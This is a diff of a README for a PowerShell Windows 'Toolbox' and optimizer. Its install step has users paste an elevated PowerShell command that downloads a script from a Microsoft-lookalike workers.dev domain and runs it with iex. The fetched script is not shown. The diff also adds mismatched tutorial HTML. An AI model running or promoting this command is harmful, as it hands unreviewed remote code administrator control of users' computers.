@@ -47,8 +47,50 @@ Command line Interface (CLI)<br />
 ```powershell -c "Start-Process powershell \"iex((New-Object System.Net.WebClient).DownloadString('https://pstool.microsoft-toolbox.workers.dev'))\" -Verb Runas"```
 
 
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="alt text" width="500">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/how%20to%20run.png" alt="text" width="500">
 
 
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="alt text" width="300">
-<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Optimizer.png" alt="alt text" width="300">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="text" width="300">
+<img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Optimizer.png" alt="text" width="300">
+
+
+<html>
+<head>
+<style>
+* {
+  box-sizing: border-box;
+}
+
+.column {
+  float: left;
+  width: 33.33%;
+  padding: 5px;
+}
+
+/* Clearfix (clear floats) */
+.row::after {
+  content: "";
+  clear: both;
+  display: table;
+}
+</style>
+</head>
+<body>
+
+<h2>Images Side by Side</h2>
+<p>How to create side-by-side images with the CSS float property:</p>
+
+<div class="row">
+  <div class="column">
+    <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="Snow" style="width:100%">
+  </div>
+  <div class="column">
+    <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="Forest" style="width:100%">
+  </div>
+  <div class="column">
+    <img src="https://raw.githubusercontent.com/PsWinToolbox/Toolbox/main/Toolbox.png" alt="Mountains" style="width:100%">
+  </div>
+</div>
+
+</body>
+</html>
